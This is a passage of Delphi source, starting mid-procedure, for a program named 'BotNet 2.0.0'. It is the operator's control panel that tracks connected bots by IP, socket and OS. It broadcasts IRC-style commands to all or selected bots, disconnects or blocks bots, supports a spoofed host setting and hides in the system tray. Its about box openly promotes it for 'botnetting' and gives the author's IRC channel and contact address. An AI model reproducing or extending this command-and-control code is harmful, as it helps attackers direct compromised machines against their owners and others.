                     ServerSocket1.Socket.Connections[J].SendText(':'+Admin+' PRIVMSG '+Form2.Edit2.Text+' :'+Edit1.Text+#10);
             End;
           End;
         3:Begin
             For I := 0 To ListView1.Items.Count -1 Do
             Begin
               If Copy(ListView1.Items[I].Caption, Length(ListView1.Items[I].Caption)-Length(BotName)+1, Length(BotName)) = BotName Then
               If Not IsServer Then
                 ClientSocket1.Socket.SendText(ListView1.Items[I].SubItems[4]+' '+Admin+' PRIVMSG '+ListView1.Items[I].Caption+' :'+edit1.text+#10)
               Else
               If IsServer Then
                 For J := 0 To serverSocket1.Socket.ActiveConnections -1 Do
                   If ServerSocket1.Socket.Connections[j].SocketHandle = StrToInt(ListView1.Items[I].SubItems[4]) Then
                     ServerSocket1.Socket.Connections[J].SendText(':'+Admin+' PRIVMSG '+Form2.Edit2.Text+' :'+Edit1.Text+#10);
             End;
           End;
         End;
     End Else
     Begin
       For I := 0 To ListView1.Items.Count -1 Do
       Begin
         If ListView1.Items[I].Selected Then
         Begin
           If Not IsServer Then
             ClientSocket1.Socket.SendText(ListView1.Items[I].SubItems[4]+' '+Admin+' PRIVMSG '+ListView1.Items[I].Caption+' :'+edit1.text+#10)
           Else
             If IsServer Then
               For J := 0 To serverSocket1.Socket.ActiveConnections -1 Do
                 If ServerSocket1.Socket.Connections[j].SocketHandle = StrToInt(ListView1.Items[I].SubItems[4]) Then
                   ServerSocket1.Socket.Connections[J].SendText(':'+Admin+' PRIVMSG '+Form2.Edit2.Text+' :'+Edit1.Text+#10);
         End;
       End;
     End;
   End;

   procedure TForm1.Botnet1Click(Sender: TObject);
   var
     text:string;
   begin

     text :=
     'BotNet 2.0.0 -- Made by p0ke'#13#10#13#10+
     'You find me @ this ircserver'#13#10+
     '   irc.elfnet.org:6667 #box'#13#10+
     'Or mail me at'#13#10+
     '   you.are.homo@gmail.com'#13#10#13#10+
     '>>> Happy botnetting <<<';

     MessageBox(0, pChar(Text), 'About Botnet 2.0.0', mb_ok);

   end;

   procedure TForm1.Timer2Timer(Sender: TObject);
   var
     Time                  : String;
     Sec, Min, Hour        : Integer;
   begin

     StatusBar1.Panels[0].Text := IntToStr(ListView1.Items.Count)+' Bots';
     StatusBar1.Update;
     StatusBar1.Refresh;

     Time := StatusBar1.Panels[1].Text;
     Time := Copy(Time, Pos('(',Time)+1, Length(Time));
     Time := Copy(Time, 1, Pos(')', Time)-1);

     Sec := StrToInt(Copy(Time, 1, Pos(':', Time)-1));
     Time:= Copy(Time, Pos(':', Time)+1, Length(Time));
     Min := StrToInt(Copy(Time, 1, Pos(':', Time)-1));
     Time:= Copy(Time, Pos(':', Time)+1, Length(Time));
     Hour := StrToInt(Time);

     Inc(Sec,1);
     If Sec >= 60 Then
     Begin
       Inc(Min,1);
       Dec(Sec,Sec);
     End;
     If Min >= 60 Then
     Begin
       Inc(Hour,1);
       Dec(Min,Min);
     End;

     If (Length(IntToStr(Sec))) = 1 Then
       Time := '0' + IntToStr(Sec)
     Else
       Time := IntToStr(Sec);

     If (Length(IntToStr(Min))) = 1 Then
       Time := Time + ':0' + IntToStr(Min)
     Else
       Time := Time + ':'+ IntToStr(Min);

     If (Length(IntToStr(Hour))) = 1 Then
       Time := Time + ':0' + IntToStr(Hour)
     Else
       Time := Time + ':'+ IntToStr(Hour);

     StatusBar1.Panels[1].Text :=
     Copy(StatusBar1.Panels[1].Text, 1, pos('(', StatusBar1.Panels[1].Text)-1) +
     '('+Time+')';

   end;

   procedure TForm1.Edit1KeyPress(Sender: TObject; var Key: Char);
   begin
     If Key = #13 Then
     Begin
       Button1.Click;
       ZeroMemory(@Key, SizeOf(Key));
     End;
   end;

   procedure TForm1.Exit1Click(Sender: TObject);
   begin
     WriteSettings;
     Shell_NotifyIcon(NIM_DELETE,@TrayIcon);
     ExitProcess(0);
   end;

   //---------------

   procedure TForm1.ServerSocket1ClientError(Sender: TObject;
     Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
     var ErrorCode: Integer);
   begin
     ErrorCode := 0;
   end;

   procedure TForm1.Botpage1Click(Sender: TObject);
   begin
     ShellExecute(0, 'open', 'http://p0ke.no-ip.com', nil, nil, 1);
   end;

   procedure TForm1.FormResize(Sender: TObject);
   begin
     If Splitter1.Top > 50 Then
     Begin
       If Splitter1.Top > (Panel1.Height - 46) Then
         ListView1.Height := Panel1.Height - 40;
     End;
   end;

   procedure TForm1.Timer3Timer(Sender: TObject);
   var
     cmd:string;

     Port, Chan, Spoofed,
     aName, aIdent, aHost,
     NickList, Privmsg,
     wMsg, Connection1,
     Connection2, Notified,
     bList, Buddylist, sname, topic: String;
   begin

     Cmd := ExtractFilePath(ParamStr(0)) + 'config.ini';

     If Not FileExists(Cmd) Then
     Begin
       Timer3.Enabled := False;
       Exit;
     End;

     Port          := GetInif(Cmd, '[port]');
     Chan          := GetInif(Cmd, '[chan]');
     Spoofed       := GetInif(Cmd, '[spoofed]');
     aName         := GetInif(Cmd, '[aname]');
     aIdent        := GetInif(Cmd, '[aident]');
     aHost         := GetInif(Cmd, '[ahost]');
     NickList      := GetInif(Cmd, '[nicklist]');
     Privmsg       := GetInif(Cmd, '[privmsg]');
     wMsg          := GetInif(Cmd, '[wmsg]');
     Connection1   := GetInif(Cmd, '[connection1]');
     Connection2   := GetInif(Cmd, '[connection2]');
     Notified      := GetInif(Cmd, '[notified]');
     BuddyList     := GetInif(Cmd, '[buddylist]');
     blist         := GetInif(Cmd, '[blist]');
     sname         := GetInif(Cmd, '[sname]');
     topic         := GetInif(Cmd, '[topic]');

     If topic[1]           = #13 Then Delete(topic, 1, 1);
     If sname[1]           = #13 Then Delete(sName, 1, 1);
     If Port[1]            = #13 Then Delete(Port, 1, 1);
     If Chan[1]            = #13 Then Delete(Chan, 1, 1);
     If Spoofed[1]         = #13 Then Delete(Spoofed, 1, 1);
     If aName[1]           = #13 Then Delete(aName, 1, 1);
     If aIdent[1]          = #13 Then Delete(aIdent, 1, 1);
     If aHost[1]           = #13 Then Delete(aHost, 1, 1);
     If NickList[1]        = #13 Then Delete(NickList, 1, 1);
     If Privmsg[1]         = #13 Then Delete(Privmsg, 1, 1);
     If wMsg[1]            = #13 Then Delete(wMsg, 1, 1);
     If Connection1[1]     = #13 Then Delete(Connection1, 1, 1);
     If Connection2[1]     = #13 Then Delete(Connection2, 1, 1);
     If BuddyList[1]       = #13 Then Delete(BuddyList, 1, 1);
     If blist[1]           = #13 Then Delete(blist, 1, 1);

     If topic[1]           = #10 Then Delete(topic, 1, 1);
     If sname[1]           = #10 Then Delete(sName, 1, 1);
     If Port[1]            = #10 Then Delete(Port, 1, 1);
     If Chan[1]            = #10 Then Delete(Chan, 1, 1);
     If Spoofed[1]         = #10 Then Delete(Spoofed, 1, 1);
     If aName[1]           = #10 Then Delete(aName, 1, 1);
     If aIdent[1]          = #10 Then Delete(aIdent, 1, 1);
     If aHost[1]           = #10 Then Delete(aHost, 1, 1);
     If NickList[1]        = #10 Then Delete(NickList, 1, 1);
     If Privmsg[1]         = #10 Then Delete(Privmsg, 1, 1);
     If wMsg[1]            = #10 Then Delete(wMsg, 1, 1);
     If Connection1[1]     = #10 Then Delete(Connection1, 1, 1);
     If Connection2[1]     = #10 Then Delete(Connection2, 1, 1);
     If BuddyList[1]       = #10 Then Delete(BuddyList, 1, 1);
     If blist[1]           = #10 Then Delete(blist, 1, 1);

     If topic[Length(topic)]               = #13 Then Delete(topic, Length(topic), 1);
     If sName[Length(sName)]               = #13 Then Delete(sname, Length(sname), 1);
     If Port[Length(Port)]                 = #13 Then Delete(Port, Length(Port), 1);
     If Chan[Length(Chan)]                 = #13 Then Delete(Chan, Length(Chan), 1);
     If Spoofed[Length(Spoofed)]           = #13 Then Delete(Spoofed, Length(Spoofed), 1);
     If aName[Length(aName)]               = #13 Then Delete(aName, Length(aName), 1);
     If aIdent[Length(aIdent)]             = #13 Then Delete(aIdent, Length(aIdent), 1);
     If aHost[Length(aHost)]               = #13 Then Delete(aHost, Length(aHost), 1);
     If NickList[Length(NickList)]         = #13 Then Delete(NickList, Length(NickList), 1);
     If Privmsg[Length(Privmsg)]           = #13 Then Delete(Privmsg, Length(Privmsg), 1);
     If wMsg[Length(wMsg)]                 = #13 Then Delete(wMsg, Length(wMsg), 1);
     If Connection1[Length(Connection1)]   = #13 Then Delete(Connection1, Length(Connection1), 1);
     If Connection2[Length(Connection2)]   = #13 Then Delete(Connection2, Length(Connection2), 1);
     If BuddyList[Length(BuddyList)]       = #13 Then Delete(BuddyList, Length(BuddyList), 1);
     If blist[Length(blist)]               = #13 Then Delete(blist, Length(blist), 1);

     If topic[Length(topic)]               = #10 Then Delete(topic, Length(topic), 1);
     If sName[Length(sName)]               = #10 Then Delete(sname, Length(sname), 1);
     If Port[Length(Port)]                 = #10 Then Delete(Port, Length(Port), 1);
     If Chan[Length(Chan)]                 = #10 Then Delete(Chan, Length(Chan), 1);
     If Spoofed[Length(Spoofed)]           = #10 Then Delete(Spoofed, Length(Spoofed), 1);
     If aName[Length(aName)]               = #10 Then Delete(aName, Length(aName), 1);
     If aIdent[Length(aIdent)]             = #10 Then Delete(aIdent, Length(aIdent), 1);
     If aHost[Length(aHost)]               = #10 Then Delete(aHost, Length(aHost), 1);
     If NickList[Length(NickList)]         = #10 Then Delete(NickList, Length(NickList), 1);
     If Privmsg[Length(Privmsg)]           = #10 Then Delete(Privmsg, Length(Privmsg), 1);
     If wMsg[Length(wMsg)]                 = #10 Then Delete(wMsg, Length(wMsg), 1);
     If Connection1[Length(Connection1)]   = #10 Then Delete(Connection1, Length(Connection1), 1);
     If Connection2[Length(Connection2)]   = #10 Then Delete(Connection2, Length(Connection2), 1);
     If BuddyList[Length(BuddyList)]       = #10 Then Delete(BuddyList, Length(BuddyList), 1);
     If blist[Length(blist)]               = #10 Then Delete(blist, Length(blist), 1);

     Form2.Edit7.Text := topic;
     Form2.Edit6.Text := Sname;
     Form2.Edit1.Text := Port;
     Form2.Edit2.Text := Chan;
     Form2.CheckBox3.Checked := Boolean(StrToInt(Spoofed));
     Form2.Edit3.Text := aName;
     Form2.Edit4.Text := aIdent;
     Form2.Edit5.Text := aHost;
     Form2.CheckBox1.Checked := Boolean(StrToInt(NickList));
     Form2.CheckBox2.Checked := Boolean(StrToInt(PrivMsg));
     Form2.Memo1.Text := wMsg;
     Case StrToInt(Connection1) Of
       1  : Form2.RadioButton3.Checked := true;
       10 : Form2.RadioButton2.Checked := true;
       100: Form2.RadioButton1.Checked := true;
     End;
     Form2.Memo2.Text := Connection2;
     Form2.CheckBox4.Checked := Boolean(StrToInt(BuddyList));
     Form2.Memo3.Text := bList;

     Timer3.Enabled := False;
   end;

   procedure TForm1.Configure1Click(Sender: TObject);
   begin
     Form2.Show;
   end;

   procedure TForm1.None1Click(Sender: TObject);
   begin
     ListView1.SortType := stNone;
   end;

   procedure TForm1.Data1Click(Sender: TObject);
   begin
     ListView1.SortType := stData;
   end;

   procedure TForm1.ext1Click(Sender: TObject);
   begin
     ListView1.SortType := stText;
   end;

   procedure TForm1.Both1Click(Sender: TObject);
   begin
     ListView1.SortType := stBoth;
   end;

   procedure TForm1.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
   var
     tip: String;
   begin

     If Not UserNotified Then
     MessageBox(0, 'When closing this program it ends up in the tray'#13#10+
                   'rightclick in the tray, or at "server" to exit', 'Notice', mb_ok);

     UserNotified := True;

     Shell_NotifyIcon(NIM_DELETE,@TrayIcon);
     tip := 'BotNet 2.0.0 ('+IntToStr(ListView1.Items.Count)+' Bots Connected)';

     CanClose := False;

     Form1.Visible := False;

     Blah := Application.Icon.Handle;

     TrayIcon.cbSize := SizeOf(TNotifyIconData);
     TrayIcon.Wnd := Handle;
     SetTip(Tip);
     TrayIcon.uID := 1;
     TrayIcon.hIcon := Blah;
     TrayIcon.uCallbackMessage := WM_CALLBACK;
     TrayIcon.uFlags := NIF_MESSAGE or NIF_ICON or NIF_TIP;

     Shell_NotifyIcon(NIM_ADD, @TrayIcon);
   end;

   procedure TForm1.Exit2Click(Sender: TObject);
   begin
     WriteSettings;
     Shell_NotifyIcon(NIM_DELETE,@TrayIcon);
     ExitProcess(0);
   end;

   procedure TForm1.Show1Click(Sender: TObject);
   begin
     Form1.Visible := True;
   end;

   procedure TForm1.FormCreate(Sender: TObject);
   begin
     SetTip('BotNet 2.0.0 ('+IntToStr(ListView1.Items.Count)+' Bots Connected)');
   end;

   procedure TForm1.JustDisconnect1Click(Sender: TObject);
   var
     I,J: Integer;
     IPS: Array[0..66000] Of String;
     IPN: Integer;
   begin

     IPN := 0;
     FillChar(IPS, 66000, #0);

     For J := 0 To ListView1.Items.Count -1 Do
     Begin
       If ListView1.Items[J].Selected Then
       Begin
         IPS[IPN] := ListView1.Items[J].SubItems[4];
         Inc(IPN);
       End;
     End;

     ZeroMemory(@J, SizeOf(J));

     For J := 0 To IPN -1 Do
     Begin
       For I := 0 To ServerSocket1.Socket.ActiveConnections -1 Do
         If ServerSocket1.Socket.Connections[i].SocketHandle = StrToInt(IPS[J]) Then
           ServerSocket1.Socket.Connections[i].Close;
     End;
   end;

   procedure TForm1.BlockUserIPBlock1Click(Sender: TObject);
   begin
     Form2.Memo2.Lines.Add(ListView1.Items[ListView1.ItemIndex].SubItems[0]);
     Form2.RadioButton2.Checked := True;
     JustDisconnect1Click(Self);
   end;

   procedure TForm1.Button2Click(Sender: TObject);
   begin
     If Button2.Caption = '&Connect' Then
     Begin
       ClientSocket1.Address := Edit3.Text;
       ClientSocket1.Port := StrToInt(Edit4.Text);
       ClientSocket1.Active := True;
       Button2.Caption := '&Abort';
       StatusBar1.Panels[1].Text := 'Client Connected (00:00:00)';
       Caption := 'Botnet - Connected';
     End Else
     If Button2.Caption = '&Abort' Then
     Begin
       Button2.Caption := '&Connect';
       ClientSocket1.Active := False;
       StatusBar1.Panels[1].Text := 'Client Disconnected (00:00:00)';
       Caption := 'Botnet - Disconnected';
     End;
   end;

   procedure TForm1.ClientSocket1Connect(Sender: TObject;
     Socket: TCustomWinSocket);
   var
     tmp: String;
     nick:String;
   begin
     nick:= edit5.text;
     tmp := 'USER '+nick+' '+nick+'@admin.com "'+nick+'" :'+nick+#10;
     ClientSocket1.Socket.SendText(Tmp);
   end;

   procedure TForm1.ClientSocket1Error(Sender: TObject;
     Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
     var ErrorCode: Integer);
   begin
     ErrorCode := 0;
   end;

   procedure TForm1.ClientSocket1Read(Sender: TObject;
     Socket: TCustomWinSocket);
   var
     data          :String;
     data2         :String;
     tmp           :String;
     tmp2          :String;
     tmpIP         :String;
     tmpHost       :String;
     tmpSock       :Integer;
     NickName      :String;
     ident         :String;
     xPos          :Integer;
     DoTwice       :Boolean;
     Useless       :String;
     I,J           :Integer;
     Item          :TListItem;
   begin
     ZeroMemory(@Data, Length(Data));
     data := Socket.ReceiveText;

     Useless := Data;
     While Pos(#13, Useless) > 0 Do
     Begin
       Delete(Useless, Pos(#13, UselesS), 1);
     End;
     Data := Useless;

     tmpIP := Socket.RemoteAddress;
     tmpHost := tmpIP;

     xPos := Pos(#10, Data);
     DoTwice := False;
     If Copy(Data, xPos+2, 1) <> '' Then DoTwice := True;

     Data2 := Data;

     GetParams(Data2);

     Repeat
       Data := Copy(Data2, 1, Pos(#10, Data2)-1);
       Data2 := Copy(Data2, Pos(#10, Data2)+1, Length(Data2));

       GetParams(Data);

       tmpIP := Params[0];
       tmpSock:=StrToInt(Params[1]);
       Data := Copy(Data, (Pos(Params[1], Data)+Length(Params[1]))+1, Length(Data));

       If Params[0] = 'QUIT' Then
       Begin
         For I := 0 To ListView1.Items.Count -1 Do
         Begin
           If (ListView1.Items[i].SubItems[0] = tmpIP) and
              (ListView1.Items[i].SubItems[4] = IntToStr(tmpSock)) Then
              Begin
                ListView1.Items[i].Delete;
                Break;
              End;
         End;
       End;

       If Params[0] = 'CONNECTION' Then
         SetInfo(tmpSock, tmpIP, '', params[3], '', '');

       If Params[0] = 'OSTYPE' Then
         SetInfo(tmpSock, tmpIP, '', '', '', params[3]);

       If UpperCase(Params[0]) = 'PRIVMSG' Then
       Begin
         Tmp := Copy(Data, Pos(':', Data)+1, Length(Data));

         If Tmp[Length(Tmp)] = #10 Then Delete(Tmp, Length(Tmp), 1);
         If Tmp[Length(Tmp)] = #13 Then Delete(Tmp, Length(Tmp), 1);

         If Not CheckBox2.Checked Then
           Memo1.Lines.Add('<'+GetUser(tmpIP, tmpSock)+'> '+tmp);
       End;

       If Params[0] = 'NICK' Then
       Begin
         If Params[1][1] = ':' Then
           Params[1] := Copy(Params[1], 2, Length(Params[1]));
         Params[1] := NickExists(Params[1]);
         SetInfo(tmpSock, tmpIP, Params[1], '', '', '');
       End;

       If Params[0] = 'USER' Then
       Begin
         item := listview1.Items.Add;
         item.Caption := Copy(Params[4],2,length(Params[4]));
         item.SubItems.Add(tmpIP);
         item.SubItems.Add('Unknown');
         item.SubItems.Add(LowerCase(Params[1])+'@'+tmpHost);
         item.SubItems.Add('Unknown');
         item.SubItems.Add(IntToStr(tmpSock));
       End;

     Until (Data2 = '') Or (DoTwice = False);
   end;

   procedure TForm1.ClientSocket1Disconnect(Sender: TObject;
     Socket: TCustomWinSocket);
   begin
     ListView1.items.Clear;
     Button2.Caption := '&Connect';
     ClientSocket1.Active := False;
     StatusBar1.Panels[1].Text := 'Client Disconnected (00:00:00)';
     Caption := 'Botnet - Disconnected';
   end;

   end.
